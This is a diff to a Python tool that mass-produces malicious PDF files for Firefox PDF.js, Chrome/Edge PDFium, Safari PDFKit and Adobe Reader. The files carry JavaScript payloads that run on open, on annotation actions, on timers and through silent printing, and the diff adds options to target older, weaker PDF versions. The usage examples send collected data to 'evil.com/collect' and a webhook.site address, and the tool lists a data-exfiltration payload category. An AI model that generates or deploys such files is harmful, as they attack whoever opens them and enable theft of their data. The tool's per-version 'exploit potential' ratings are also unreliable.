@@ -659,296 +659,334 @@ class AdvancedPayloadGenerator:
 
         return all_payloads
 
+# PDF Version Capabilities and Security Features
+def get_pdf_version_capabilities(version):
+    """Get PDF version capabilities and supported features"""
+    capabilities = {
+        '1.0': {
+            'javascript': False,
+            'forms': False,
+            'annotations': False,
+            'encryption': False,
+            'multimedia': False,
+            'digital_signatures': False,
+            'description': 'Basic PDF - No JavaScript, very limited features',
+            'security_level': 'Minimal',
+            'exploit_potential': 'Very Low'
+        },
+        '1.1': {
+            'javascript': False,
+            'forms': False,
+            'annotations': False,
+            'encryption': False,
+            'multimedia': False,
+            'digital_signatures': False,
+            'description': 'Enhanced basic PDF - Still no JavaScript support',
+            'security_level': 'Minimal',
+            'exploit_potential': 'Very Low'
+        },
+        '1.2': {
+            'javascript': False,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': False,
+            'digital_signatures': False,
+            'description': 'Forms and annotations - Limited security measures',
+            'security_level': 'Low',
+            'exploit_potential': 'Low'
+        },
+        '1.3': {
+            'javascript': True,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': False,
+            'digital_signatures': False,
+            'description': 'First JavaScript support - Basic sandbox only',
+            'security_level': 'Low-Medium',
+            'exploit_potential': 'Medium'
+        },
+        '1.4': {
+            'javascript': True,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': True,
+            'digital_signatures': False,
+            'description': 'Enhanced JavaScript and multimedia - Improved but limited sandbox',
+            'security_level': 'Medium',
+            'exploit_potential': 'High'
+        },
+        '1.5': {
+            'javascript': True,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': True,
+            'digital_signatures': True,
+            'description': 'Object streams and digital signatures - Better security',
+            'security_level': 'Medium-High',
+            'exploit_potential': 'High'
+        },
+        '1.6': {
+            'javascript': True,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': True,
+            'digital_signatures': True,
+            'description': 'Enhanced encryption and signatures - Modern security features',
+            'security_level': 'High',
+            'exploit_potential': 'Medium-High'
+        },
+        '1.7': {
+            'javascript': True,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': True,
+            'digital_signatures': True,
+            'description': 'Latest PDF 1.x features - Strong sandbox restrictions',
+            'security_level': 'Very High',
+            'exploit_potential': 'Medium'
+        },
+        '2.0': {
+            'javascript': True,
+            'forms': True,
+            'annotations': True,
+            'encryption': True,
+            'multimedia': True,
+            'digital_signatures': True,
+            'description': 'Latest standard - Maximum security and sandbox restrictions',
+            'security_level': 'Maximum',
+            'exploit_potential': 'Low'
+        }
+    }
+    return capabilities.get(version, capabilities['1.7'])
+
+def list_pdf_versions():
+    """List all PDF versions and their security characteristics"""
+    print("📄 PDF STANDARD VERSIONS AND SECURITY CHARACTERISTICS:")
+    print("=" * 65)
+    
+    versions = ['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0']
+    
+    for version in versions:
+        caps = get_pdf_version_capabilities(version)
+        print(f"\\n🔹 PDF-{version}")
+        print(f"   Security Level: {caps['security_level']}")
+        print(f"   Exploit Potential: {caps['exploit_potential']}")
+        print(f"   JavaScript: {'✅' if caps['javascript'] else '❌'}")
+        print(f"   Forms: {'✅' if caps['forms'] else '❌'}")
+        print(f"   Annotations: {'✅' if caps['annotations'] else '❌'}")
+        print(f"   Encryption: {'✅' if caps['encryption'] else '❌'}")
+        print(f"   Description: {caps['description']}")
+    
+    print(f"\\n💡 SECURITY RESEARCH INSIGHT:")
+    print("Older PDF versions (1.0-1.3) have minimal security measures and weaker sandboxing.")
+    print("Versions 1.3+ introduce JavaScript but with varying sandbox restrictions.")
+    print("Modern versions (1.6+) have strong security but may still be vulnerable to sophisticated exploits.")
+
 # Enhanced PDF Creation with Browser Optimization
-def create_sophisticated_pdf(filename, payload_data):
-    """Create sophisticated PDF with browser-specific optimizations"""
+def create_sophisticated_pdf(filename, payload_data, pdf_version=None):
+    """Create sophisticated PDF with browser-specific optimizations and PDF version targeting"""
     payload = payload_data['payload']
     browser = payload_data['browser']
     
-    # Browser-optimized PDF structures for maximum exploitation potential
-    if browser == 'firefox':
-        # PDF.js optimized structure with CSP bypass potential
-        pdf_content = f'''%PDF-1.4
+    # Auto-determine PDF version based on browser if not specified
+    if pdf_version is None:
+        browser_defaults = {
+            'firefox': '1.4',    # PDF.js commonly supports 1.4
+            'safari': '1.6',     # PDFKit supports modern features
+            'adobe': '1.7',      # Adobe Reader supports latest
+            'chrome': '1.7',     # PDFium supports latest
+            'edge': '1.7'        # Edge supports latest
+        }
+        pdf_version = browser_defaults.get(browser, '1.7')
+    
+    # Get PDF version capabilities
+    capabilities = get_pdf_version_capabilities(pdf_version)
+    
+    # Adapt payload based on PDF version capabilities
+    if not capabilities['javascript']:
+        # For PDF versions without JavaScript, use structure-based exploits
+        payload = f"// PDF-{pdf_version} - No JavaScript support, using structure-based exploit\\n{payload}"
+    
+    # Enhanced PDF structure based on version and capabilities
+    # Enhanced PDF structure based on version and capabilities
+    if pdf_version in ['1.0', '1.1']:
+        # Very basic PDF structure - no JavaScript or forms
+        pdf_content = f'''%PDF-{pdf_version}
 1 0 obj
 <<
 /Type /Catalog
 /Pages 2 0 R
-/OpenAction 3 0 R
-/Names 4 0 R
 >>
 endobj
 
 2 0 obj
 <<
 /Type /Pages
-/Kids [5 0 R]
+/Kids [3 0 R]
 /Count 1
 >>
 endobj
 
 3 0 obj
 <<
-/Type /Action
-/S /JavaScript
-/JS ({payload})
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 4 0 R
 >>
 endobj
 
 4 0 obj
 <<
-/JavaScript 6 0 R
+/Length 100
+>>
+stream
+BT
+/F1 12 Tf
+50 700 Td
+(PDF-{pdf_version} Basic Structure) Tj
+0 -20 Td
+(No JavaScript Support) Tj
+ET
+endstream
+endobj'''
+
+        # Append xref table separately to avoid Python number parsing issues
+        pdf_content += '''
+xref
+0 5
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000115 00000 n 
+0000000201 00000 n 
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+352
+%%EOF'''
+    
+    elif pdf_version == '1.2':
+        # Basic forms and annotations support - limited security
+        pdf_content = f'''%PDF-{pdf_version}
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/AcroForm 3 0 R
 >>
 endobj
 
-5 0 obj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Fields [5 0 R]
+/DR 6 0 R
+>>
+endobj
+
+4 0 obj
 <<
 /Type /Page
 /Parent 2 0 R
 /MediaBox [0 0 612 792]
 /Contents 7 0 R
-/AA 8 0 R
->>
-endobj
-
-6 0 obj
-<<
-/Names [(exploit) 9 0 R]
->>
-endobj
-
-7 0 obj
-<<
-/Length 50
->>
-stream
-BT
-/F1 12 Tf
-100 700 Td
-(Firefox PDF.js Exploit) Tj
-ET
-endstream
-endobj
-
-8 0 obj
-<<
-/O 3 0 R
-/C 3 0 R
->>
-endobj
-
-9 0 obj
-<<
-/S /JavaScript
-/JS ({payload})
->>
-endobj
-
-xref
-0 10
-0000000000 65535 f 
-0000000009 00000 n 
-0000000084 00000 n 
-0000000141 00000 n 
-0000000205 00000 n 
-0000000238 00000 n 
-0000000332 00000 n 
-0000000371 00000 n 
-0000000472 00000 n 
-0000000506 00000 n 
-trailer
-<<
-/Size 10
-/Root 1 0 R
->>
-startxref
-563
-%%EOF'''
-
-    elif browser == 'adobe':
-        # Adobe Reader with full JavaScript API support
-        pdf_content = f'''%PDF-1.7
-1 0 obj
-<<
-/Type /Catalog
-/Pages 2 0 R
-/OpenAction 3 0 R
-/AcroForm 4 0 R
-/Names 5 0 R
-/JavaScript 6 0 R
->>
-endobj
-
-2 0 obj
-<<
-/Type /Pages
-/Kids [7 0 R]
-/Count 1
->>
-endobj
-
-3 0 obj
-<<
-/Type /Action
-/S /JavaScript
-/JS ({payload})
->>
-endobj
-
-4 0 obj
-<<
-/Fields [8 0 R]
-/DA (/Helv 0 Tf 0 g)
-/DR 9 0 R
+/Annots [5 0 R]
 >>
 endobj
 
 5 0 obj
 <<
-/JavaScript 10 0 R
+/Type /Annot
+/Subtype /Widget
+/Rect [100 100 200 150]
+/T (ExploitField)
 >>
 endobj
 
 6 0 obj
 <<
-/Names [(init) 11 0 R (exploit) 12 0 R]
+/Font 8 0 R
 >>
 endobj
 
 7 0 obj
 <<
-/Type /Page
-/Parent 2 0 R
-/MediaBox [0 0 612 792]
-/Contents 13 0 R
-/Annots [8 0 R]
-/AA 14 0 R
->>
-endobj
-
-8 0 obj
-<<
-/Type /Annot
-/Subtype /Widget
-/Rect [100 100 200 150]
-/AA 15 0 R
->>
-endobj
-
-9 0 obj
-<<
-/Font 16 0 R
->>
-endobj
-
-10 0 obj
-<<
-/Names [(payload) 17 0 R]
->>
-endobj
-
-11 0 obj
-<<
-/S /JavaScript
-/JS ({payload})
->>
-endobj
-
-12 0 obj
-<<
-/S /JavaScript  
-/JS ({payload})
->>
-endobj
-
-13 0 obj
-<<
-/Length 55
+/Length 120
 >>
 stream
 BT
 /F1 12 Tf
-100 700 Td
-(Adobe Acrobat Advanced Exploit) Tj
+50 700 Td
+(PDF-{pdf_version} Forms Support) Tj
+0 -20 Td
+(Basic Annotation Exploit Potential) Tj
 ET
 endstream
 endobj
 
-14 0 obj
+8 0 obj
 <<
-/O 3 0 R
-/C 3 0 R
+/F1 9 0 R
 >>
 endobj
 
-15 0 obj
-<<
-/E 3 0 R
-/X 3 0 R
-/D 3 0 R
-/U 3 0 R
->>
-endobj
-
-16 0 obj
-<<
-/F1 18 0 R
->>
-endobj
-
-17 0 obj
-<<
-/S /JavaScript
-/JS ({payload})
->>
-endobj
-
-18 0 obj
+9 0 obj
 <<
 /Type /Font
 /Subtype /Type1
 /BaseFont /Helvetica
 >>
-endobj
+endobj'''
 
+        # Append xref table separately to avoid Python number parsing issues
+        pdf_content += '''
 xref
-0 19
+0 10
 0000000000 65535 f 
 0000000009 00000 n 
-0000000133 00000 n 
-0000000190 00000 n 
-0000000254 00000 n 
-0000000315 00000 n 
-0000000348 00000 n 
-0000000405 00000 n 
-0000000509 00000 n 
-0000000583 00000 n 
-0000000611 00000 n 
-0000000650 00000 n 
-0000000707 00000 n 
-0000000764 00000 n 
-0000000870 00000 n 
-0000000904 00000 n 
-0000000956 00000 n 
-0000000981 00000 n 
-0000001038 00000 n 
+0000000069 00000 n 
+0000000126 00000 n 
+0000000173 00000 n 
+0000000267 00000 n 
+0000000349 00000 n 
+0000000382 00000 n 
+0000000570 00000 n 
+0000000603 00000 n 
 trailer
 <<
-/Size 19
+/Size 10
 /Root 1 0 R
 >>
 startxref
-1120
+692
 %%EOF'''
-
-    elif browser == 'safari':
-        # Safari PDFKit optimized for macOS integration
-        pdf_content = f'''%PDF-1.6
+    
+    elif pdf_version == '1.3':
+        # First JavaScript support - basic sandbox, high exploit potential
+        pdf_content = f'''%PDF-{pdf_version}
 1 0 obj
 <<
 /Type /Catalog
 /Pages 2 0 R
 /OpenAction 3 0 R
-/Names 4 0 R
+/AcroForm 4 0 R
 >>
 endobj
 
@@ -970,7 +1008,8 @@ endobj
 
 4 0 obj
 <<
-/JavaScript 6 0 R
+/Fields [6 0 R]
+/DR 7 0 R
 >>
 endobj
 
@@ -979,83 +1018,106 @@ endobj
 /Type /Page
 /Parent 2 0 R
 /MediaBox [0 0 612 792]
-/Contents 7 0 R
-/AA 8 0 R
+/Contents 8 0 R
+/Annots [6 0 R]
 >>
 endobj
 
 6 0 obj
 <<
-/Names [(webkit) 9 0 R]
+/Type /Annot
+/Subtype /Widget
+/Rect [100 100 200 150]
+/AA 9 0 R
+/T (ExploitField)
 >>
 endobj
 
 7 0 obj
 <<
-/Length 52
+/Font 10 0 R
 >>
-stream
-BT
-/F1 12 Tf
-100 700 Td
-(Safari PDFKit macOS Exploit) Tj
-ET
-endstream
 endobj
 
 8 0 obj
 <<
-/O 3 0 R
-/C 3 0 R
+/Length 140
 >>
+stream
+BT
+/F1 12 Tf
+50 700 Td
+(PDF-{pdf_version} JavaScript Exploit) Tj
+0 -20 Td
+(Basic Sandbox - High Exploit Potential) Tj
+ET
+endstream
 endobj
 
 9 0 obj
 <<
+/Type /Action
 /S /JavaScript
 /JS ({payload})
 >>
 endobj
 
+10 0 obj
+<<
+/F1 11 0 R
+>>
+endobj
+
+11 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+>>
+endobj'''
+
+        # Append xref table separately to avoid Python number parsing issues
+        pdf_content += '''
 xref
-0 10
+0 12
 0000000000 65535 f 
 0000000009 00000 n 
-0000000081 00000 n 
-0000000138 00000 n 
-0000000202 00000 n 
-0000000235 00000 n 
-0000000329 00000 n 
-0000000365 00000 n 
-0000000469 00000 n 
-0000000503 00000 n 
+0000000084 00000 n 
+0000000141 00000 n 
+0000000198 00000 n 
+0000000245 00000 n 
+0000000343 00000 n 
+0000000442 00000 n 
+0000000475 00000 n 
+0000000696 00000 n 
+0000000753 00000 n 
+0000000787 00000 n 
 trailer
 <<
-/Size 10
+/Size 12
 /Root 1 0 R
 >>
 startxref
-560
+876
 %%EOF'''
-
-    else:
-        # Enhanced generic structure for Chrome, Edge and others with sophisticated features
-        pdf_content = f'''%PDF-1.7
+    
+    elif pdf_version in ['1.4', '1.5']:
+        # Enhanced JavaScript and multimedia support with moderate security
+        pdf_content = f'''%PDF-{pdf_version}
 1 0 obj
 <<
 /Type /Catalog
 /Pages 2 0 R
 /OpenAction 3 0 R
-/AcroForm 4 0 R
-/Names 5 0 R
-/JavaScript 6 0 R
+/Names 4 0 R
+/AcroForm 5 0 R
 >>
 endobj
 
 2 0 obj
 <<
 /Type /Pages
-/Kids [7 0 R]
+/Kids [6 0 R]
 /Count 1
 >>
 endobj
@@ -1070,33 +1132,31 @@ endobj
 
 4 0 obj
 <<
-/Fields [8 0 R]
-/DA (/Helv 0 Tf 0 g)
-/DR 9 0 R
+/JavaScript 7 0 R
 >>
 endobj
 
 5 0 obj
 <<
-/JavaScript 10 0 R
+/Fields [8 0 R]
+/DR 9 0 R
 >>
 endobj
 
 6 0 obj
 <<
-/Names [(init) 11 0 R (exploit) 12 0 R (persistent) 13 0 R]
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 10 0 R
+/Annots [8 0 R]
+/AA 11 0 R
 >>
 endobj
 
 7 0 obj
 <<
-/Type /Page
-/Parent 2 0 R
-/MediaBox [0 0 612 792]
-/Contents 14 0 R
-/Annots [8 0 R]
-/AA 15 0 R
-/Resources 9 0 R
+/Names [(exploit) 12 0 R (persistent) 13 0 R]
 >>
 endobj
 
@@ -1105,33 +1165,44 @@ endobj
 /Type /Annot
 /Subtype /Widget
 /Rect [100 100 200 150]
-/AA 16 0 R
+/AA 14 0 R
 /T (ExploitField)
 >>
 endobj
 
 9 0 obj
 <<
-/Font 17 0 R
+/Font 15 0 R
 >>
 endobj
 
 10 0 obj
 <<
-/Names [(payload) 18 0 R (secondary) 19 0 R]
+/Length 160
 >>
+stream
+BT
+/F1 12 Tf
+50 700 Td
+(PDF-{pdf_version} Enhanced JavaScript) Tj
+0 -20 Td
+(Multimedia Support - Moderate Security) Tj
+0 -20 Td
+(High Exploit Potential) Tj
+ET
+endstream
 endobj
 
 11 0 obj
 <<
-/S /JavaScript
-/JS ({payload})
+/O 3 0 R
+/C 3 0 R
 >>
 endobj
 
 12 0 obj
 <<
-/S /JavaScript  
+/S /JavaScript
 /JS ({payload})
 >>
 endobj
@@ -1145,92 +1216,347 @@ endobj
 
 14 0 obj
 <<
-/Length 55
+/Type /Action
+/S /JavaScript
+/JS ({payload})
+>>
+endobj
+
+15 0 obj
+<<
+/F1 16 0 R
+>>
+endobj
+
+16 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+>>
+endobj'''
+
+        # Append xref table separately to avoid Python number parsing issues
+        pdf_content += '''
+xref
+0 17
+0000000000 65535 f 
+0000000009 00000 n 
+0000000094 00000 n 
+0000000151 00000 n 
+0000000208 00000 n 
+0000000241 00000 n 
+0000000288 00000 n 
+0000000396 00000 n 
+0000000452 00000 n 
+0000000551 00000 n 
+0000000584 00000 n 
+0000000823 00000 n 
+0000000860 00000 n 
+0000000917 00000 n 
+0000000995 00000 n 
+0000001052 00000 n 
+0000001086 00000 n 
+trailer
+<<
+/Size 17
+/Root 1 0 R
+>>
+startxref
+1175
+%%EOF'''
+    
+    elif pdf_version in ['1.6', '1.7', '2.0']:
+        # Modern PDF with enhanced security features but still exploitable
+        # Browser-specific optimizations for modern versions
+        if browser == 'firefox':
+            # PDF.js optimized for CSP bypass
+            js_optimization = "// PDF.js CSP bypass attempt\\n"
+        elif browser == 'safari':
+            # PDFKit specific optimizations
+            js_optimization = "// PDFKit macOS integration\\n"
+        elif browser == 'adobe':
+            # Adobe Reader full API exploitation
+            js_optimization = "// Adobe Reader full API\\n"
+        else:
+            # Chrome/Edge PDFium optimizations
+            js_optimization = "// PDFium sandbox escape\\n"
+        
+        enhanced_payload = js_optimization + payload
+        
+        pdf_content = f'''%PDF-{pdf_version}
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+/AcroForm 4 0 R
+/Names 5 0 R
+/JavaScript 6 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [7 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS ({enhanced_payload})
+>>
+endobj
+
+4 0 obj
+<<
+/Fields [8 0 R]
+/DA (/Helv 0 Tf 0 g)
+/DR 9 0 R
+>>
+endobj
+
+5 0 obj
+<<
+/JavaScript 10 0 R
+>>
+endobj
+
+6 0 obj
+<<
+/Names [(init) 11 0 R (exploit) 12 0 R (persistent) 13 0 R (fallback) 14 0 R]
+>>
+endobj
+
+7 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 15 0 R
+/Annots [8 0 R]
+/AA 16 0 R
+/Resources 9 0 R
+>>
+endobj
+
+8 0 obj
+<<
+/Type /Annot
+/Subtype /Widget
+/Rect [100 100 200 150]
+/AA 17 0 R
+/T (ExploitField)
+>>
+endobj
+
+9 0 obj
+<<
+/Font 18 0 R
+>>
+endobj
+
+10 0 obj
+<<
+/Names [(payload) 19 0 R (secondary) 20 0 R]
+>>
+endobj
+
+11 0 obj
+<<
+/S /JavaScript
+/JS (app.setTimeOut('({enhanced_payload})', 100);)
+>>
+endobj
+
+12 0 obj
+<<
+/S /JavaScript
+/JS ({enhanced_payload})
+>>
+endobj
+
+13 0 obj
+<<
+/S /JavaScript
+/JS (try {{ {enhanced_payload} }} catch(e) {{ app.alert('Persistent: ' + e); }})
+>>
+endobj
+
+14 0 obj
+<<
+/S /JavaScript
+/JS (this.print({{bUI: false, bSilent: true, bShrinkToFit: true}}); {enhanced_payload})
+>>
+endobj
+
+15 0 obj
+<<
+/Length 180
 >>
 stream
 BT
 /F1 12 Tf
-100 700 Td
-(Advanced PDF Sandbox Exploit) Tj
+50 700 Td
+(PDF-{pdf_version} Advanced Security) Tj
+0 -20 Td
+(Browser: {browser.title()}) Tj
+0 -20 Td
+(Enhanced Sandbox Escape Techniques) Tj
+0 -20 Td
+(Multiple Execution Vectors) Tj
 ET
 endstream
 endobj
 
-15 0 obj
+16 0 obj
 <<
 /O 3 0 R
 /C 3 0 R
 >>
 endobj
 
-16 0 obj
-<<
-/E 3 0 R
-/X 3 0 R
-/D 3 0 R
-/U 3 0 R
-/Fo 3 0 R
->>
-endobj
-
 17 0 obj
 <<
-/F1 20 0 R
+/Type /Action
+/S /JavaScript
+/JS ({enhanced_payload})
 >>
 endobj
 
 18 0 obj
 <<
-/S /JavaScript
-/JS ({payload})
+/F1 21 0 R
 >>
 endobj
 
 19 0 obj
 <<
 /S /JavaScript
-/JS (try {{ {payload} }} catch(e) {{ app.launchURL('data:text/html,<script>{payload}</script>'); }})
+/JS ({enhanced_payload})
 >>
 endobj
 
 20 0 obj
 <<
+/S /JavaScript
+/JS (app.setTimeOut('try{{ {enhanced_payload} }}catch(e){{}}', 2000);)
+>>
+endobj
+
+21 0 obj
+<<
 /Type /Font
 /Subtype /Type1
 /BaseFont /Helvetica
 >>
-endobj
+endobj'''
 
+        # Append xref table separately to avoid Python number parsing issues
+        pdf_content += '''
 xref
-0 21
+0 22
 0000000000 65535 f 
 0000000009 00000 n 
-0000000147 00000 n 
-0000000204 00000 n 
-0000000268 00000 n 
-0000000329 00000 n 
-0000000362 00000 n 
-0000000439 00000 n 
-0000000563 00000 n 
-0000000647 00000 n 
-0000000675 00000 n 
-0000000734 00000 n 
-0000000791 00000 n 
-0000000848 00000 n 
-0000000920 00000 n 
-0000001026 00000 n 
-0000001060 00000 n 
-0000001112 00000 n 
-0000001140 00000 n 
-0000001197 00000 n 
-0000001304 00000 n 
+0000000111 00000 n 
+0000000168 00000 n 
+0000000225 00000 n 
+0000000291 00000 n 
+0000000324 00000 n 
+0000000418 00000 n 
+0000000540 00000 n 
+0000000639 00000 n 
+0000000672 00000 n 
+0000000723 00000 n 
+0000000812 00000 n 
+0000000869 00000 n 
+0000000958 00000 n 
+0000001067 00000 n 
+0000001338 00000 n 
+0000001375 00000 n 
+0000001432 00000 n 
+0000001466 00000 n 
+0000001523 00000 n 
+0000001612 00000 n 
 trailer
 <<
-/Size 21
+/Size 22
 /Root 1 0 R
 >>
 startxref
-1386
+1701
+%%EOF'''
+    
+    else:
+        # Fallback to PDF-1.7 if version not recognized
+        pdf_content = f'''%PDF-1.7
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS ({payload})
+>>
+endobj
+
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 5 0 R
+>>
+endobj
+
+5 0 obj
+<<
+/Length 80
+>>
+stream
+BT
+/F1 12 Tf
+100 700 Td
+(PDF Fallback Structure) Tj
+ET
+endstream
+endobj'''
+
+        # Append xref table separately to avoid Python number parsing issues
+        pdf_content += '''
+xref
+0 6
+0000000000 65535 f 
+0000000009 00000 n 
+0000000069 00000 n 
+0000000126 00000 n 
+0000000183 00000 n 
+0000000269 00000 n 
+trailer
+<<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+398
 %%EOF'''
 
     with open(filename, 'w') as f:
@@ -1262,12 +1588,22 @@ PAYLOAD CATEGORIES:
   sandbox_escape     - PDF sandbox restriction bypasses
   network_exfiltration - Data exfiltration and covert channels
 
+PDF VERSIONS (Older = Weaker Security):
+  1.0, 1.1  - No JavaScript, minimal security (Very Low exploit potential)
+  1.2       - Basic forms, limited security (Low exploit potential)  
+  1.3       - First JavaScript, weak sandbox (Medium exploit potential)
+  1.4, 1.5  - Enhanced features, moderate security (High exploit potential)
+  1.6, 1.7  - Modern features, strong security (Medium exploit potential)
+  2.0       - Latest standard, maximum security (Low exploit potential)
+
 EXAMPLES:
-  python3 script.py -b chrome -u http://evil.com/collect    # 200 Chrome exploits
-  python3 script.py -b all -u https://webhook.site/xyz     # 1000+ all exploits
-  python3 script.py -b adobe --category file_system        # Adobe file exploits
-  python3 script.py --list-research                        # Show CVE references
-  python3 script.py -v --output-json                       # Verbose with JSON output
+  python3 script.py -b chrome -u http://evil.com/collect         # 200 Chrome exploits
+  python3 script.py -b all -u https://webhook.site/xyz          # 1000+ all exploits
+  python3 script.py --pdf-version 1.3 -b firefox               # PDF-1.3 weak sandbox
+  python3 script.py --pdf-version 1.0 -b all                   # PDF-1.0 minimal security
+  python3 script.py --list-pdf-versions                         # Show PDF capabilities
+  python3 script.py --list-research                             # Show CVE references
+  python3 script.py -v --output-json                            # Verbose with JSON output
 
 RESEARCH BASE: 50+ CVEs, academic papers, bug bounty reports, security conferences
 LEGAL NOTICE: For authorized security testing only. Users responsible for compliance.
@@ -1293,6 +1629,11 @@ LEGAL NOTICE: For authorized security testing only. Users responsible for compli
                         help='Verbose output with payload details')
     parser.add_argument('--parallel', action='store_true',
                         help='Enable parallel PDF generation for faster processing')
+    parser.add_argument('--pdf-version', 
+                        choices=['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'],
+                        help='PDF standard version (older versions have fewer security measures)')
+    parser.add_argument('--list-pdf-versions', action='store_true',
+                        help='List available PDF versions and their capabilities')
     
     args = parser.parse_args()
     
@@ -1313,6 +1654,10 @@ LEGAL NOTICE: For authorized security testing only. Users responsible for compli
             
         print(f"\\nTotal Research Base: {sum(len(cves) for cves in research_data.values())} CVEs")
         print("Additional Sources: Academic papers, bug bounty reports, security conferences")
+        return
+    
+    if args.list_pdf_versions:
+        list_pdf_versions()
         return
     
     # Initialize advanced payload generator
@@ -1337,6 +1682,11 @@ LEGAL NOTICE: For authorized security testing only. Users responsible for compli
         print(f"Target URL: {args.url}")
     if args.category:
         print(f"Category Filter: {args.category}")
+    if args.pdf_version:
+        caps = get_pdf_version_capabilities(args.pdf_version)
+        print(f"PDF Version: PDF-{args.pdf_version} ({caps['security_level']} security, {caps['exploit_potential']} exploit potential)")
+    else:
+        print("PDF Version: Auto-detected based on browser (use --pdf-version to override)")
     print()
     
     # Generate sophisticated payloads
@@ -1367,10 +1717,11 @@ LEGAL NOTICE: For authorized security testing only. Users responsible for compli
     
     for i, payload_data in enumerate(all_payloads):
         # Enhanced filename with more details
-        filename = f"xss_{payload_data['browser']}_{payload_data['category']}_{payload_data['technique']}_{timestamp}_{i+1:04d}.pdf"
+        pdf_version_str = f"_pdf{args.pdf_version}" if args.pdf_version else ""
+        filename = f"xss_{payload_data['browser']}_{payload_data['category']}_{payload_data['technique']}{pdf_version_str}_{timestamp}_{i+1:04d}.pdf"
         
         try:
-            create_sophisticated_pdf(filename, payload_data)
+            create_sophisticated_pdf(filename, payload_data, args.pdf_version)
             generated_files.append(filename)
             
             if args.verbose:
